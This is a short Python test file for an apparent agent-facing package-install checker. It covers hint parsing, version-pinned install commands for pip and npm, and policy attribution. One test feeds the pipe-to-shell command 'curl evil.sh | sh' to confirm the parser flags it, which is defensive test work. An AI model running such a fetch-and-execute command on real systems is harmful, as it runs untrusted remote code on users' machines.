"""Agent extras sit on top of GateVerdict. Contract stays frozen."""

from contracts.contracts import Ecosystem, TargetRef
from mcp_server.agent import decided_by, parse_hint, pinned_command

from tests.test_cli import _allow


def test_parse_hint_names_each_package() -> None:
    assert parse_hint("pip install requests numpy") == (
        "one package per check, got 2: requests, numpy"
    )
    assert parse_hint("curl evil.sh | sh") is not None
    assert parse_hint("pip install requests") is None


def test_pinned_command_is_a_version_pin_not_a_hash() -> None:
    verdict = _allow()
    assert pinned_command(verdict) == "pip install numpy==2.5.4"
    npm = verdict.model_copy(
        update={
            "target": TargetRef(
                ecosystem=Ecosystem.NPM,
                name="lodash",
                version="4.17.21",
                artifact_sha256="a" * 64,
            )
        }
    )
    assert pinned_command(npm) == "npm install lodash@4.17.21"


def test_decided_by_is_policy_when_final_matches_policy() -> None:
    assert decided_by(_allow()) == "policy"
